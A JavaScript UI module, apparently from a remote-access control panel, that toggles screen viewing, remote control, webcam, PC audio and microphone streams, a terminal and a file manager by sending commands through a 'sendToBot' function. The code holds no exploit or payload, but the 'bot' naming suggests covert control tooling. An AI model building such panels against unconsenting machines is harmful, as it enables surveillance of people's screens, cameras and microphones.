// frontend/client_control/js/modules/ui/header.js
import { AppState } from '../core/states.js';

export const initHeaderControls = () => {
  const $ = id => document.getElementById(id);
  
  // Конфигурация строго по ТЗ V7.2
  // Модули: ScreenView, RemoteControl, Webcam. Мета: None
  const actions = [
    { id: 'btn-desktop-stream', ref: AppState.desktop, key: 'observe', mod: 'ScreenView:None' },
    { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'RemoteControl:None' },
    { id: 'btn-webcam-stream', ref: AppState.webcam, key: 'active', mod: 'Webcam:None' },
    { id: 'btn-audio-pc', ref: AppState.audio, key: 'output', mod: 'AudioPulse:PC' },
    { id: 'btn-audio-mic', ref: AppState.audio, key: 'input', mod: 'AudioPulse:Mic' }
  ];

  const toggleAction = (a, force = null, silent = false) => {
    const btn = $(a.id), state = force ?? !a.ref[a.key];
    if (a.ref[a.key] === state && force === null) return;
    
    a.ref[a.key] = state;
    btn?.classList.toggle('active', state);

    if (a.id === 'btn-desktop-control') {
      const cvs = $('desktopCanvas');
      cvs && Object.assign(cvs.style, { pointerEvents: state ? 'auto' : 'none' });
      state && cvs?.focus();
    }

    // ТЗ V7.2: payload 1 или 0 (window.sendToBot упакует это в 4 байта BigEndian)
    if (!silent && window.sendToBot) {
        window.sendToBot(a.mod, state ? 1 : 0);
    }
  };

  // ... остальной код (setupToggle и т.д.) без изменений
  const setupToggle = (id, ovlId, onOpen) => {
    const btn = $(id), ovl = $(ovlId);
    if (!btn || !ovl) return;
    btn.onclick = () => {
      const isH = ovl.classList.toggle('hidden');
      btn.classList.toggle('active', !isH);
      !isH && onOpen?.();
    };
  };

  setupToggle('btn-terminal-toggle', 'terminal-overlay', () => {
    window.resetTerminalPosition?.();
    setTimeout(() => $('terminal-cmd')?.focus(), 50);
  });
  
  setupToggle('btn-files-toggle', 'files-overlay', () => window.openFileManager?.());

  actions.forEach(a => {
    const el = $(a.id);
    el && (el.onclick = () => toggleAction(a));
  });

  window.syncModeResources = mode => {
    const termOvl = $('terminal-overlay'), filesOvl = $('files-overlay');
    const termBtn = $('btn-terminal-toggle'), filesBtn = $('btn-files-toggle');
    
    [termOvl, filesOvl].forEach(el => el?.classList.add('hidden'));
    [termBtn, filesBtn].forEach(el => el?.classList.remove('active'));
    
    if (mode === 'webcam') {
      toggleAction(actions[0], false); // Stop ScreenView
      toggleAction(actions[1], false); // Stop RemoteControl
    } else if (mode === 'desktop') {
      toggleAction(actions[2], false); // Stop Webcam
    }
  };
};